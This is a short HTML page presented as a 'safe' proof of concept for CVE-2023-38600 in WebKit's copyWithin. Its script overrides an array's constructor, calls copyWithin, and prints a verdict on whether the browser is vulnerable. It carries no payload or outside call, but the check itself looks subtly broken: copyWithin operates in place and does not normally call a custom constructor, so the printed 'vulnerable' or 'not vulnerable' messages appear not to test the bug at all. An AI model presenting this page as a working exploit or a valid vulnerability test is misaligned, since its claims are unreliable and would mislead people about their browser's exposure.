<!DOCTYPE html>
<html>
<head>
  <title>CVE-2023-38600 WebKit copyWithin PoC (Safe)</title>
  <meta charset="UTF-8">
</head>
<body>
<h1>CVE-2023-38600 (WebKit copyWithin) Proof of Concept</h1>
<pre id="log"></pre>
<script>
function log(msg) {
  document.getElementById('log').textContent += msg + "\n";
}

try {
  let arr = [1.1, 2.2, 3.3, 4.4];
  let crafted = null;

  arr.constructor = function() {
    crafted = new Float64Array(8);
    log("[*] Custom constructor called, returning crafted Float64Array: " + crafted);
    return crafted;
  };

  log("[*] Before copyWithin, arr: " + arr);

  arr.copyWithin(1, 2, 3);

  log("[*] After copyWithin, arr: " + arr);

  if (crafted) {
    log("[*] Crafted array contents: " + Array.from(crafted));
    log("[*] If you see abnormal output or a crash, this browser is likely vulnerable to CVE-2023-38600.");
  } else {
    log("[!] Custom constructor was NOT called. This browser is likely NOT vulnerable to CVE-2023-38600, or mitigation is present.");
  }
} catch (e) {
  log("[!] Exception: " + e);
}
</script>
</body>
</html>
